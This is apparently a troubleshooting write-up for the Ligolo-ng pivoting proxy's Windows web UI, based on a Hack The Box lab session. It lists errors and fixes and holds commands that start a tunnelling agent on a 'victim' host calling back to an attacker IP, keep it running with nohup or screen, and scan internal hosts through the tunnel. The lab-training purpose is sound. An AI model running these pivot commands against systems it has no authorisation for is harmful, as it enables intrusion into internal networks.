# Ligolo-ng Web UI — Windows Troubleshooting Guide
### Real-World Walkthrough: HTB/CPTS Internal Pivot via DMZ

> This document is a complete record of every error encountered running Ligolo-ng proxy on **Windows** with the Web UI, and the exact fixes applied. Based on a real HTB lab session pivoting through `DMZ01 → 172.16.119.0/24`.

---

## Environment

| Component | Details |
|---|---|
| Attacker OS | Windows 10/11 |
| Proxy binary | `proxy.exe` v0.8.3 |
| Agent binary | `agent` (Linux AMD64) |
| VPN IP | `10.10.14.198` (OpenVPN TAP-Windows6) |
| Proxy port | `11601` |
| Web UI port | `8080` |
| DMZ Host | `jbetty@DMZ01` — `10.129.234.116` (external) / `172.16.119.13` (internal) |
| Target subnet | `172.16.119.0/24` |

---

## Lab Scope (for context)

| Host | IP |
|---|---|
| DMZ01 | `10.129.*.*` (external), `172.16.119.13` (internal) |
| JUMP01 | `172.16.119.7` |
| FILE01 | `172.16.119.10` |
| DC01 | `172.16.119.11` |

---

## Problem 1 — Interface Showing "Pending" in Web UI

### Symptom
Interfaces tab shows `ligolo` with an orange **Pending** badge instead of green **Active**.

### Root Cause
The TUN interface exists at OS level but no agent session has been started and bound to it yet. The interface is waiting for a tunnel to be assigned.

### Fix
1. Ensure agent is connected on the victim machine
2. Go to **Agents tab** → click **Setup Tunneling**
3. Select the interface → click **Setup routes and start tunnel**

The status changes from Pending → Active only after a live tunnel is bound.

---

## Problem 2 — `wintun.dll` Not Found (Panic / Crash)

### Symptom
Every time Setup Tunneling is clicked, the proxy crashes with:
```
panic recovered:
Error loading wintun.dll DLL: Unable to load library: The specified module could not be found.
```

### Root Cause
Ligolo-ng on Windows requires `wintun.dll` to create TUN interfaces. It is **not bundled** in the proxy binary and must be placed manually in the same folder as `proxy.exe`.

### Fix

**Step 1 — Download Wintun:**
```powershell
Invoke-WebRequest -Uri "https://www.wintun.net/builds/wintun-0.14.1.zip" -OutFile wintun.zip
Expand-Archive -Path wintun.zip -DestinationPath wintun_extracted
```

**Step 2 — Copy the correct DLL (amd64):**
```powershell
copy wintun_extracted\wintun\bin\amd64\wintun.dll D:\path\to\ligolo-ng\Windows\
```

**Step 3 — Verify both files are in the same folder:**
```powershell
ls D:\path\to\ligolo-ng\Windows\
# Should show: proxy.exe  wintun.dll
```

> Always use `amd64` — not `x86` or `arm64`.

---

## Problem 3 — Access Denied When Starting Tunnel (Code 0x00000005)

### Symptom
After placing `wintun.dll`, the tunnel attempt fails with:
```
Failed to create private namespace: Access is denied. (Code 0x00000005)
Failed to take device installation mutex: Access is denied. (Code 0x00000005)
```

### Root Cause
Wintun needs to install a virtual network driver into the Windows kernel. This requires **Administrator privileges**.

### Fix
Close current PowerShell. Reopen as Administrator:

> **Right-click PowerShell → "Run as Administrator"**

Then restart proxy:
```powershell
cd D:\path\to\ligolo-ng\Windows\
.\proxy.exe -selfcert -api-laddr 127.0.0.1:8080
```

---

## Problem 4 — Duplicate Interfaces (ligolo 1, htb-internal 1)

### Symptom
`ipconfig` or the Interfaces tab shows multiple adapters:
```
Unknown adapter htb-internal:   ...
Unknown adapter htb-internal 1: ...
```

### Root Cause
Every time **"Create a new interface"** is selected in the Setup Tunneling dialog, Ligolo creates a brand new WinTUN adapter. Since one already existed, Windows names the new one with a `1` suffix. This causes route confusion because routes may end up on the wrong interface.

### Fix

**Step 1 — Delete duplicates from Web UI:**
Interfaces tab → click the red **⊗** button on every duplicate (`htb-internal 1`, `ligolo 1`, etc.)

**Step 2 — Remove orphaned adapters via PowerShell (Admin):**
```powershell
Get-NetAdapter | Where-Object {$_.Name -like "htb*" -or $_.Name -like "ligolo*"} | Remove-NetAdapter -Confirm:$false
```

**Step 3 — Always use "Use an existing interface" next time:**
In the Setup Tunneling dialog, select **"Use an existing interface"** → pick the existing one from the dropdown. Never click "Create a new interface" if it already exists.

---

## Problem 5 — Agent Keeps Disconnecting (EOF / Keepalive Failed)

### Symptom
Proxy log shows repeated connection and immediate drop:
```
Starting tunnel to jbetty@DMZ01
Lost tunnel connection with agent jbetty@DMZ01
keepalive failed: i/o deadline reached
decoder: unable to decode payload type: EOF
Tunnel cleaned up, waiting for agent to reconnect...
```

### Root Cause
Multiple agent processes running simultaneously on the victim. Old agent instance from a previous session is still alive, causing the proxy to reject new connections as duplicates, which then immediately EOF.

### Fix

**On the victim machine — kill all agent processes first:**
```bash
pkill -f agent
# or
kill $(pgrep -f agent)
```

**Verify none remain:**
```bash
ps aux | grep agent
```

**Then restart the proxy (Admin PowerShell):**
```powershell
.\proxy.exe -selfcert -api-laddr 127.0.0.1:8080
```

**Start ONE agent instance on victim:**
```bash
./agent -connect 10.10.14.198:11601 -ignore-cert
```

**Wait for proxy to confirm:**
```
Agent joined.
```

**Only then** click Setup Tunneling in the Web UI. Do not click it multiple times.

**To keep agent alive persistently:**
```bash
# Option 1 - background
nohup ./agent -connect 10.10.14.198:11601 -ignore-cert &

# Option 2 - screen session
screen -S ligolo
./agent -connect 10.10.14.198:11601 -ignore-cert
# Ctrl+A then D to detach
```

---

## Problem 6 — Routes Added to Wrong Interface

### Symptom
Autoroute dialog assigns `172.16.119.0/24` to `htb-internal` but the agent is tunneling through `ligolo` — or vice versa. Ping hangs.

### Root Cause
The interface the agent is tunneling through and the interface holding the routes must match. If they differ, traffic has no path.

### Fix

**Web UI — Interfaces tab:**
Click **X** on the misplaced route tag to remove it from the wrong interface.

**Web UI — Interfaces tab:**
Click the terminal icon on the correct interface and add the subnet there.

**Verify agent is bound to the correct interface:**
Agents tab → check the **Interface** column shows the right interface name.

**Or do it all at once cleanly:**
Agents tab → Stop tunnel → Setup Tunneling → select correct interface → check correct subnet → Setup routes and start tunnel.

---

## Problem 7 — Ping Hangs but Tunnel is Working

### Symptom
```powershell
ping 172.16.119.7
# Hangs with no response, requires Ctrl+C
```

But Nmap works:
```powershell
nmap 172.16.119.7 -Pn -sV
# Returns open ports
```

### Root Cause
ICMP (ping) is blocked by Windows Firewall or host-based firewall rules on the target. This is normal in Active Directory environments. The tunnel itself is perfectly functional — ICMP is just not allowed.

### How to Confirm Tunnel is Working
```powershell
# Use Nmap with -Pn to skip ping
nmap 172.16.119.7 -Pn -sV

# Use Test-NetConnection for specific ports
Test-NetConnection -ComputerName 172.16.119.7 -Port 445
Test-NetConnection -ComputerName 172.16.119.7 -Port 5985
```

If ports respond → tunnel is working. Ignore ping failures.

---

## Problem 8 — Route Already Exists Error

### Symptom
```powershell
route add 172.16.119.0 mask 255.255.255.0 0.0.0.0 if 3
# The route addition failed: The object already exists.
```

### Root Cause
The Web UI already added the route when Setup Tunneling was clicked. The manual `route add` command is redundant.

### Fix
This is not an error — the route is already there. Verify with:
```powershell
route print | findstr 172.16
```

If the route is listed, the tunnel is configured correctly. Move on to testing connectivity with Nmap instead of ping.

---

## Problem 9 — APIPA Address on TUN Interface (169.254.x.x)

### Symptom
```
Unknown adapter htb-internal:
   Autoconfiguration IPv4 Address. . : 169.254.229.67
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
```

### Root Cause
The WinTUN virtual adapter has no DHCP server and no static IP assigned. Windows assigns an APIPA address (`169.254.x.x`) as a fallback. This is **completely normal** for Ligolo TUN interfaces.

### Why It Doesn't Matter
Ligolo-ng does not use the interface's own IP for routing. It uses the kernel routing table entry (`route add`) to direct traffic. The APIPA address on the adapter itself is irrelevant — traffic is routed at Layer 3 based on the destination subnet, not the adapter's own IP.

Do not attempt to assign a static IP to the ligolo adapter. Leave it as-is.

---

## Problem 10 — Messy YAML Config Causing Auto-Binding and Duplicate Interfaces

### Symptom
Every proxy restart automatically creates interfaces, adds wrong routes, and binds agents without asking. Multiple interfaces accumulate.

### Root Cause
The `ligolo-ng.yaml` has `agent:` and `interface:` blocks that pre-configure everything on startup:

```yaml
agent:
    deadbeefcafe:
        autobind: true
        interface: ligolo   # ← auto-binds every agent to ligolo
interface:
    htb-internal:
        routes:
            - 172.16.119.13/24
    ligolo:
        routes:
            - 10.254.0.0/24
            - 10.255.0.0/24
```

### Fix — Clean YAML (keep only web section)

```yaml
web:
    behindreverseproxy: false
    debug: false
    enabled: true
    enableui: true
    listen: 127.0.0.1:8080
    logfile: ui.log
    secret: YOUR_SECRET_HERE
    trustedproxies:
        - 127.0.0.1
    users:
        ligolo: $argon2id$v=19$m=32768,t=3,p=4$YOUR_HASH_HERE
```

Remove: `agent:` block, `interface:` block, `corsallowedorigin:`, `tls:` block (use `-selfcert` flag instead).

---

## Clean Setup Procedure (Windows — Definitive)

Follow this every time from a clean state.

### Prerequisites
- `proxy.exe` and `wintun.dll` in the same folder
- PowerShell running as Administrator
- Agent binary uploaded to victim

### Step 1 — Start Proxy
```powershell
.\proxy.exe -selfcert -api-laddr 127.0.0.1:8080
```

### Step 2 — Open Web UI
```
https://127.0.0.1:8080
```
Accept the self-signed certificate warning.

### Step 3 — Create Interface (once only)
Interfaces tab → **Add New +** → name it (e.g. `pivot`) → confirm.

### Step 4 — Start Agent on Victim
```bash
./agent -connect ATTACKER_VPN_IP:11601 -ignore-cert
```

Wait for proxy console:
```
Agent joined.
```

### Step 5 — Setup Tunnel
Agents tab → **Setup Tunneling** → **Use an existing interface** → select `pivot` → check only the target subnet → **Setup routes and start tunnel**.

### Step 6 — Verify (use Nmap, not ping)
```powershell
nmap TARGET_IP -Pn -sV
```

---

## Quick Diagnostics Reference

| Symptom | Check | Fix |
|---|---|---|
| Interface Pending | No agent tunnel active | Setup Tunneling in Agents tab |
| wintun.dll not found | DLL missing from proxy folder | Copy wintun amd64 DLL next to proxy.exe |
| Access Denied 0x00000005 | Not running as Administrator | Right-click → Run as Administrator |
| Duplicate interfaces | "Create new" clicked multiple times | Delete duplicates, always use "existing" |
| EOF / keepalive failed | Multiple agent processes on victim | `pkill -f agent`, restart clean |
| Routes on wrong interface | Agent/route interface mismatch | Remove route, re-add to correct interface |
| Ping hangs | ICMP blocked by firewall | Use `nmap -Pn` instead — tunnel is fine |
| Route already exists | Web UI already added it | Verify with `route print`, not an error |
| APIPA 169.254.x.x | No IP on TUN adapter | Normal — ignore it, routing still works |
| YAML auto-creating interfaces | `agent:` / `interface:` blocks in yaml | Remove those blocks, keep only `web:` |

---

## Final Proof — Tunnel Working

After all fixes, Nmap confirmed internal hosts reachable through the tunnel:

```
nmap 172.16.119.7 -Pn -sV
Host is up (0.27s latency)
PORT     STATE SERVICE
3389/tcp open  tcpwrapped   ← RDP
5985/tcp open  tcpwrapped   ← WinRM
```

